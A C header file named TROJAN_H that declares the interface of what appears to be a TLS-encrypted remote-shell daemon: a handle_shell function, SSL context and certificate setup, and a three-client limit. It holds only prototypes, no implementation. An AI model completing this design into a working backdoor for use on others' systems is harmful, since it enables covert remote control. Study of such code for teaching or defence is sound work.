#ifndef TROJAN_H
#define TROJAN_H

#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <syslog.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/file.h>
#include <pthread.h>
#include <sys/wait.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <sys/select.h>

#define MAX_CLIENTS 3

typedef struct s_args {
    int client_socket;
    SSL *ssl;
} t_args;


void handle_shell(SSL *ssl);
SSL_CTX *create_context();
void configure_cert(SSL_CTX *ctx);
void ft_shutdown(t_args *args);
void format_response(char *dest, char *src);

#endif
